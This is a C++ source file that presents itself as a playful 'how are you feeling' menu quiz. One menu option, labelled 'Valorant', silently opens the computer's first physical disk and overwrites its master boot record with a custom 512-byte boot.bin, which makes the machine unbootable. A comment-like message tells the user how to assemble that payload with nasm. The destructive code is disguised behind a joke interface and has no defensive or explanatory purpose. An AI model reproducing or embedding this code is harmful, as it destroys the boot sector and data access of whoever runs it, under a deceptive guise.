#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <Windows.h>
int emotion;

int main()
{
    std::cout << "How are you feeling today?\n";
    std::cout << "1. Happy\n";
    std::cout << "2. Mad\n";
    std::cout << "3. Chris Coleman\n";
    std::cout << "4. Football\n";
    std::cout << "5. Valorant\n";
    std::cin >> emotion;

    switch (emotion) {
    case 1:
        std::cout << "Have a good day";
        break;
    case 2:
        std::cout << "GRRRRRRRRRRRRRRRRRRRRRRR";
        break;
    case 3:
        std::cout << "Rizz";
        break;
    case 4:
        std::cout << "I LOVE FOOTBALL";
        break;
    case 5:
        HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        if (drive == INVALID_HANDLE_VALUE) { printf("Error opening a handle to the drive."); return -1; }

        HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (binary == INVALID_HANDLE_VALUE) { printf("Error opening a handle to boot.bin"); return -1; }

        DWORD size = GetFileSize(binary, 0);
        if (size != 512) { printf("Error opening a handle to boot.bin"); return -1; }

        byte* new_mbr = new byte[size];
        DWORD bytes_read;
        if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
        {
            if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
            {
                printf("First sector overritten successfuly!\n");
            }
        }
        else
        {
            printf("Error reading boot.bin\n");
            printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'");
        }

        CloseHandle(binary);
        CloseHandle(drive);
        std::getchar();
        break;
    default:
         std::cout << "UHHHH THATS NOT AN OPTION DUDE";
         break;
    }
}
